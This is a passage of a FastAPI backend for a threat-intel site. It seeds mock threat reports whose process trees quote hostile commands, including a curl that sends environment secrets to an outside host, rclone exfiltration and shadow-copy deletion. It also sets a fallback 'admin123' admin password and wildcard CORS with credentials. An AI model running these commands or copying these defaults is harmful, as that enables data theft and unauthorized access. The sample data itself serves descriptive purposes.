            "source": "Palo Alto Networks · Unit42 Timely Threat Intel",
            "repo_url": f"https://github.com/{UNIT42_REPO}",
            "updated": datetime.now(timezone.utc).isoformat(),
            "types": INTEL_TYPES,
            "total": total,
            "page": page,
            "page_size": page_size,
            "has_more": start + page_size < total,
            "count": len(items),
            "items": list(items),
        }
    except Exception as e:
        logger.error(f"Intel feed error: {e}")
        raise HTTPException(status_code=502, detail="Unable to reach Unit42 intel feed")


@api_router.get("/")
async def root():
    return {"message": "NivX Machines API online"}


app.include_router(api_router)

app.add_middleware(
    CORSMiddleware,
    allow_credentials=True,
    allow_origins=os.environ.get('CORS_ORIGINS', '*').split(','),
    allow_methods=["*"],
    allow_headers=["*"],
)


# ---------------------------------------------------------------------------
# Seeding
# ---------------------------------------------------------------------------
async def seed_admin():
    admin_email = os.environ.get("ADMIN_EMAIL", "admin@nivxmachines.com").lower()
    admin_password = os.environ.get("ADMIN_PASSWORD", "admin123")
    existing = await db.users.find_one({"email": admin_email})
    if existing is None:
        await db.users.insert_one({
            "email": admin_email,
            "password_hash": hash_password(admin_password),
            "name": "NivX Admin",
            "role": "admin",
            "created_at": now_iso(),
        })
        logger.info("Seeded admin user")
    elif not verify_password(admin_password, existing["password_hash"]):
        await db.users.update_one({"email": admin_email}, {"$set": {"password_hash": hash_password(admin_password)}})


SAMPLE_THREATS = [
    {
        "title": "APT41 Supply-Chain Implant via Signed Binary",
        "summary": "State-aligned actor abused a trusted software update channel to deploy a memory-resident implant, establishing C2 over HTTPS beaconing to a fronted domain.",
        "severity": "critical",
        "category": "APT / Supply Chain",
        "threat_actor": "APT41 (Double Dragon)",
        "image_url": "https://images.unsplash.com/photo-1555066931-4365d14bab8c?crop=entropy&cs=srgb&fm=jpg&q=85&w=1200",
        "attack_chain": ["Initial Access", "Execution", "Persistence", "Defense Evasion", "Command & Control", "Exfiltration"],
        "iocs": ["sha256:9f2b...c41a", "domain:cdn-update[.]net", "ip:45.61.136.9"],
        "process_tree": {
            "name": "update.exe", "pid": "4120", "cmd": "update.exe /silent", "malicious": False,
            "children": [
                {"name": "rundll32.exe", "pid": "5188", "cmd": "rundll32 loader.dll,Start", "malicious": True, "children": [
                    {"name": "powershell.exe", "pid": "6012", "cmd": "-enc SQBFAFgA...", "malicious": True, "children": []}
                ]}
            ]
        },
        "source": "NivX Threat Intel",
    },
    {
        "title": "Akira Ransomware Exploiting VPN Zero-Day",
        "summary": "Affiliate leveraged an unpatched VPN appliance to gain a foothold, disabled EDR, and detonated ransomware across the domain within 6 hours of intrusion.",
        "severity": "critical",
        "category": "Ransomware",
        "threat_actor": "Akira",
        "image_url": "https://images.unsplash.com/photo-1644088379091-d574269d422f?crop=entropy&cs=srgb&fm=jpg&q=85&w=1200",
        "attack_chain": ["Initial Access", "Credential Access", "Lateral Movement", "Defense Evasion", "Impact"],
        "iocs": ["sha256:1a77...ff03", "ext:.akira", "ip:185.156.72.14"],
        "process_tree": {
            "name": "svchost.exe", "pid": "980", "cmd": "svchost -k netsvcs", "malicious": False,
            "children": [
                {"name": "cmd.exe", "pid": "2210", "cmd": "vssadmin delete shadows /all", "malicious": True, "children": [
                    {"name": "akira.exe", "pid": "3320", "cmd": "akira.exe -p C:\\", "malicious": True, "children": []}
                ]}
            ]
        },
        "source": "NivX Threat Intel",
    },
    {
        "title": "AI-Generated Phishing Kit Targeting Fintech",
        "summary": "LLM-crafted lures with pixel-perfect cloned login portals harvested MFA tokens via reverse-proxy (AiTM). NivX AI classifier flagged anomalous domain entropy.",
        "severity": "high",
        "category": "Phishing / AiTM",
        "threat_actor": "Storm-1101 (cluster)",
        "image_url": "https://images.unsplash.com/photo-1680992046626-418f7e910589?crop=entropy&cs=srgb&fm=jpg&q=85&w=1200",
        "attack_chain": ["Reconnaissance", "Resource Development", "Initial Access", "Credential Access"],
        "iocs": ["domain:secure-fintech-login[.]com", "url:/auth/relay", "ja3:e7d705a3..."],
        "process_tree": {
            "name": "chrome.exe", "pid": "7788", "cmd": "chrome --app=https://phish", "malicious": False,
            "children": [
                {"name": "relay-proxy", "pid": "8090", "cmd": "evilginx2", "malicious": True, "children": []}
            ]
        },
        "source": "NivX Threat Intel",
    },
    {
        "title": "Scattered Spider Help-Desk Social Engineering",
        "summary": "Threat actor impersonated employees to a service desk, reset MFA, and pivoted to cloud identity provider. NivX identity analytics flagged impossible-travel sign-ins minutes before privilege escalation.",
        "severity": "critical",
        "category": "Identity / Social Engineering",
        "threat_actor": "Scattered Spider (UNC3944)",
        "image_url": "https://images.pexels.com/photos/5380664/pexels-photo-5380664.jpeg?auto=compress&cs=tinysrgb&w=1200",
        "attack_chain": ["Reconnaissance", "Initial Access", "Privilege Escalation", "Lateral Movement", "Collection", "Exfiltration"],
        "iocs": ["ip:104.28.246.11", "email:it-support@nivx-helpdesk[.]com", "ua:Mozilla/5.0 (okta-bypass)"],
        "process_tree": {
            "name": "okta-session", "pid": "-", "cmd": "MFA reset via help desk", "malicious": True,
            "children": [
                {"name": "aws-cli", "pid": "3011", "cmd": "aws sts assume-role", "malicious": True, "children": [
                    {"name": "s3-sync", "pid": "3044", "cmd": "aws s3 sync s3://crown-jewels ./", "malicious": True, "children": []}
                ]}
            ]
        },
        "source": "NivX Threat Intel",
    },
    {
        "title": "LockBit Affiliate Double-Extortion Campaign",
        "summary": "Initial access broker sold RDP creds; affiliate exfiltrated 400GB before encryption. NivX MDR isolated 3 hosts and blocked the exfil channel, containing spread to 4% of the estate.",
        "severity": "critical",
        "category": "Ransomware",
        "threat_actor": "LockBit 3.0 affiliate",
        "image_url": "https://images.pexels.com/photos/60504/security-protection-anti-virus-software-60504.jpeg?auto=compress&cs=tinysrgb&w=1200",
        "attack_chain": ["Initial Access", "Discovery", "Lateral Movement", "Collection", "Exfiltration", "Impact"],
        "iocs": ["sha256:c9d3...81be", "ext:.lockbit", "ip:193.201.9.55", "tool:rclone.exe"],
        "process_tree": {
            "name": "mstsc.exe", "pid": "1120", "cmd": "RDP session (stolen creds)", "malicious": True,
            "children": [
                {"name": "rclone.exe", "pid": "2288", "cmd": "rclone copy C:\\ mega:exfil", "malicious": True, "children": []},
                {"name": "lockbit.exe", "pid": "2290", "cmd": "lockbit -encrypt -spread", "malicious": True, "children": []}
            ]
        },
        "source": "NivX Threat Intel",
    },
    {
        "title": "Malicious npm Package Backdoors CI Pipeline",
        "summary": "A typosquatted dependency executed a postinstall script that exfiltrated CI secrets and planted a build-time backdoor. NivX SCA blocked the package hash across all pipelines.",
        "severity": "high",
        "category": "Supply Chain / DevSecOps",
        "threat_actor": "Unattributed",
        "image_url": "https://images.pexels.com/photos/11035380/pexels-photo-11035380.jpeg?auto=compress&cs=tinysrgb&w=1200",
        "attack_chain": ["Resource Development", "Initial Access", "Execution", "Credential Access", "Exfiltration"],
        "iocs": ["npm:reqwest-utils@1.2.9", "domain:collect-metrics[.]dev", "sha256:44af...9c02"],
        "process_tree": {
            "name": "node", "pid": "512", "cmd": "npm install", "malicious": False,
            "children": [
                {"name": "sh", "pid": "540", "cmd": "node postinstall.js", "malicious": True, "children": [
                    {"name": "curl", "pid": "551", "cmd": "curl -d @/proc/self/environ collect-metrics.dev", "malicious": True, "children": []}
                ]}
            ]
        },
        "source": "NivX Threat Intel",
    },
    {
        "title": "Volt Typhoon Living-off-the-Land in OT Network",
        "summary": "State actor used only built-in tools (LOLBins) to persist in critical-infrastructure OT for months. NivX behavioral analytics surfaced anomalous wmic and netsh usage from a jump host.",
        "severity": "high",
        "category": "APT / Critical Infrastructure",
        "threat_actor": "Volt Typhoon",
        "image_url": "https://images.pexels.com/photos/2881229/pexels-photo-2881229.jpeg?auto=compress&cs=tinysrgb&w=1200",
        "attack_chain": ["Initial Access", "Persistence", "Defense Evasion", "Discovery", "Lateral Movement"],
        "iocs": ["ip:45.32.174.20", "lolbin:wmic.exe", "lolbin:netsh.exe", "cred:cached NTLM"],
        "process_tree": {
            "name": "wmiprvse.exe", "pid": "760", "cmd": "wmic process call create", "malicious": True,
            "children": [
                {"name": "netsh.exe", "pid": "812", "cmd": "netsh interface portproxy add", "malicious": True, "children": []}
            ]
        },
        "source": "NivX Threat Intel",
    },
]


async def seed_threats():
    for t in SAMPLE_THREATS:
        existing = await db.threat_reports.find_one({"title": t["title"]})
        if existing is None:
            report = ThreatReport(**t)
            await db.threat_reports.insert_one(report.model_dump())
    logger.info("Threat reports seeded/verified")


@app.on_event("startup")
async def startup():
    await db.users.create_index("email", unique=True)
    await seed_admin()
    await seed_threats()


@app.on_event("shutdown")
async def shutdown_db_client():
    client.close()
